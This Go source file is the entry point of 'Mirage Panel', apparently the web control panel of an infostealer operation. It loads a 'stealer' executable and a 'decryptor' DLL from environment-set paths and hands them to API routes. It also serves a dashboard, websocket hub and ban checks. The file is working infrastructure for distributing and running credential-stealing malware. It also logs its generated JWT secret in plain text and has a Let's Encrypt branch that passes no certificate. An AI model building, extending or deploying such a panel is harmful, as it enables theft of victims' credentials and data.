package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"embed"
	"encoding/hex"
	"encoding/pem"
	"io/fs"
	"log/slog"
	"math/big"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/go-chi/chi/v5"
	chimw "github.com/go-chi/chi/v5/middleware"
	_ "modernc.org/sqlite"

	"github.com/user/mirage-panel/internal/api"
	"github.com/user/mirage-panel/internal/db"
	mw "github.com/user/mirage-panel/internal/middleware"
	"github.com/user/mirage-panel/internal/ws"
)

//go:embed frontend/dist
var frontendFS embed.FS

func getEnv(key, fallback string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return fallback
}

func generateSecret() string {
	b := make([]byte, 32)
	if _, err := rand.Read(b); err != nil {
		slog.Error("failed to generate random secret", "err", err)
		os.Exit(1)
	}
	return hex.EncodeToString(b)
}

func generateSelfSignedCert(certDir string) (string, string, error) {
	certPath := filepath.Join(certDir, "cert.pem")
	keyPath := filepath.Join(certDir, "key.pem")

	if _, err := os.Stat(certPath); err == nil {
		return certPath, keyPath, nil
	}

	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return "", "", err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()),
		Subject: pkix.Name{
			Organization: []string{"Mirage Panel"},
			CommonName:   "localhost",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		DNSNames:              []string{"localhost"},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
	if err != nil {
		return "", "", err
	}

	if err := os.MkdirAll(certDir, 0700); err != nil {
		return "", "", err
	}

	certOut, err := os.Create(certPath)
	if err != nil {
		return "", "", err
	}
	defer certOut.Close()
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certDER}); err != nil {
		return "", "", err
	}

	keyOut, err := os.Create(keyPath)
	if err != nil {
		return "", "", err
	}
	defer keyOut.Close()
	if err := pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)}); err != nil {
		return "", "", err
	}

	slog.Info("generated self-signed certificate", "cert", certPath, "key", keyPath)
	return certPath, keyPath, nil
}

func main() {
	port := getEnv("PORT", "8080")
	dbPath := getEnv("DB_PATH", "data/mirage.db")
	jwtSecret := getEnv("JWT_SECRET", "")
	allowedOrigins := getEnv("ALLOWED_ORIGINS", "http://localhost:5173")

	tlsEnabled, _ := strconv.ParseBool(os.Getenv("TLS_ENABLED"))
	useSelfSigned, _ := strconv.ParseBool(os.Getenv("TLS_SELF_SIGNED"))

	if jwtSecret == "" {
		jwtSecret = generateSecret()
		slog.Warn("JWT_SECRET not set, generated random secret for this session", "secret", jwtSecret)
	}

	slog.Info("starting Mirage Panel",
		"port", port,
		"db", dbPath,
		"tls", tlsEnabled,
		"allowed_origins", allowedOrigins,
	)

	if err := os.MkdirAll(filepath.Dir(dbPath), 0755); err != nil {
		slog.Error("failed to create data directory", "err", err)
		os.Exit(1)
	}

	sqlDB, err := db.OpenDB(dbPath)
	if err != nil {
		slog.Error("failed to open database", "err", err)
		os.Exit(1)
	}
	defer sqlDB.Close()

	if err := db.RunMigrations(sqlDB, db.MigrationsFS); err != nil {
		slog.Error("failed to run migrations", "err", err)
		os.Exit(1)
	}

	r := chi.NewRouter()

	r.Use(chimw.RequestID)
	r.Use(mw.RealIP)
	r.Use(chimw.Logger)
	r.Use(chimw.Recoverer)
	r.Use(chimw.Timeout(30 * time.Second))

	r.Use(mw.CORS(allowedOrigins))
	r.Use(mw.RateLimit(100, time.Minute))
	r.Use(mw.BanCheck(sqlDB))

	r.Get("/health", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"status":"ok"}`))
	})

	wsHub := ws.NewHub()
	go wsHub.Run()

	r.Get("/ws", ws.ServeWs(wsHub, jwtSecret))

	stealerPath := getEnv("STEALER_EXE_PATH", "")
	var stealerExe []byte
	if stealerPath != "" {
		var err error
		stealerExe, err = os.ReadFile(stealerPath)
		if err != nil {
			slog.Error("failed to read stealer exe", "path", stealerPath, "err", err)
			os.Exit(1)
		}
		slog.Info("loaded stealer executable", "path", stealerPath, "size", len(stealerExe))
	}

	decryptorPath := getEnv("DECRYPTOR_DLL_PATH", "")
	var decryptorDll []byte
	if decryptorPath != "" {
		var err error
		decryptorDll, err = os.ReadFile(decryptorPath)
		if err != nil {
			slog.Error("failed to read decryptor DLL", "path", decryptorPath, "err", err)
			os.Exit(1)
		}
		slog.Info("loaded decryptor DLL", "path", decryptorPath, "size", len(decryptorDll))
	}

	api.SetupRoutes(r, sqlDB, jwtSecret, allowedOrigins, wsHub, stealerExe, decryptorDll)

	distFS, err := fs.Sub(frontendFS, "frontend/dist")
	if err != nil {
		slog.Error("failed to resolve frontend filesystem", "err", err)
		os.Exit(1)
	}

	r.Handle("/assets/*", http.FileServer(http.FS(distFS)))

	r.NotFound(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasPrefix(r.URL.Path, "/api/") {
			http.NotFound(w, r)
			return
		}
		index, err := fs.ReadFile(distFS, "index.html")
		if err != nil {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		w.Write(index)
	})

	srv := &http.Server{
		Addr:    ":" + port,
		Handler: r,
	}

	go func() {
		addr := srv.Addr
		if tlsEnabled {
			scheme := "https"
			if useSelfSigned {
				certDir := filepath.Join(filepath.Dir(dbPath), "certs")
				certFile, keyFile, err := generateSelfSignedCert(certDir)
				if err != nil {
					slog.Error("failed to generate self-signed cert", "err", err)
					os.Exit(1)
				}
				slog.Info("listening", "addr", addr, "scheme", scheme, "tls", "self-signed")
				if err := srv.ListenAndServeTLS(certFile, keyFile); err != nil && err != http.ErrServerClosed {
					slog.Error("server error", "err", err)
					os.Exit(1)
				}
			} else {
				slog.Info("listening", "addr", addr, "scheme", scheme, "tls", "lets-encrypt")
				if err := srv.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
					slog.Error("server error", "err", err)
					os.Exit(1)
				}
			}
		} else {
			slog.Info("listening", "addr", addr, "scheme", "http")
			if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				slog.Error("server error", "err", err)
				os.Exit(1)
			}
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit

	slog.Info("shutting down...")

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	if err := srv.Shutdown(ctx); err != nil {
		slog.Error("forced shutdown", "err", err)
	}

	slog.Info("stopped")
}
